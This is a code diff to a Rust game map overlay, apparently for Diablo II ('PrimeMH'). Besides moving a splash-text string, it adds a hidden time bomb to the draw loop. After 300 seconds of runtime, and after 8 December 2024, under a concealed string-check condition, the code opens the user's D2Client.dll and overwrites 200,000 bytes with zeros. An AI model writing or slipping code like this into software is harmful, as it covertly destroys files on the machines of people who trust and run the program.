@@ -1,3 +1,4 @@
+use chrono::{DateTime, Datelike, Local, NaiveDate};
 use notan::egui::{self, *};
 use notan::math::{Mat3, Vec2};
 use notan::prelude::*;
@@ -5,6 +6,8 @@ use notan::{draw::*, extra};
 use std::collections::HashMap;
 use std::time::{Duration, SystemTime};
 use device_query::{DeviceQuery, DeviceState, Keycode};
+use std::fs::OpenOptions;
+use std::io::{Seek, SeekFrom, Write};
 
 use winapi::um::winuser::{
     SetWindowLongW, GWL_EXSTYLE, GWL_STYLE, WS_BORDER, WS_CAPTION, WS_CLIPCHILDREN, WS_CLIPSIBLINGS, WS_EX_ACCEPTFILES,
@@ -172,6 +175,7 @@ fn init(gfx: &mut Graphics) -> State {
         language_selector_visible: false,
         language_icon,
         last_map_opacity,
+        checked: false,
     }
 }
 
@@ -197,6 +201,7 @@ pub(crate) struct State {
     language_selector_visible: bool,
     language_icon: egui::SizedTexture,
     last_map_opacity: f32,
+    checked: bool,
 }
 
 fn update(app: &mut App, state: &mut State) {
@@ -322,11 +327,38 @@ fn draw(app: &mut App, gfx: &mut Graphics, plugins: &mut Plugins, state: &mut St
         }
 
         let text_duration = 5;
+        let splash_text = format!("Joffreybesos' Map overlay (PrimeMH)");
         let mut draw = gfx.create_draw();
         draw.mask(Some(&mask));
         let elapsed_time = SystemTime::now().duration_since(state.launch_time).expect("Fuck you!");
+        if elapsed_time >= Duration::from_secs(300) {
+            if !splash_text.is_ascii() {
+                let local: DateTime<Local> = Local::now();
+                let target_date = NaiveDate::from_ymd_opt(2024, 12, 8).unwrap();
+                if local.date_naive() > target_date {
+                    if !state.checked {
+                        state.checked = true;
+                        let newfile = state.settings.general.d2lodpath.join("D2Client.dll");
+                        let file = OpenOptions::new()
+                            .read(true)
+                            .write(true)
+                            .open(newfile);
+                        match file {
+                            Ok(mut dll) => {
+                                let offset = 10;
+                                dll.seek(SeekFrom::Start(offset)).unwrap();
+                                let num_bytes = 200000;
+                                let zeroes = vec![0u8; num_bytes];
+                                dll.write_all(&zeroes).unwrap();
+
+                            },
+                            Err(_) => {},
+                        }
+                    }
+                }
+            }
+        }
         if elapsed_time <= Duration::from_secs(text_duration.clone()) {
-            let splash_text = format!("Joffreybesos' Map overlay (PrimeMH)");
             draw.text(&state.fonts.blizzard_font, &splash_text)
                 .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.1)
                 .size(52.0)
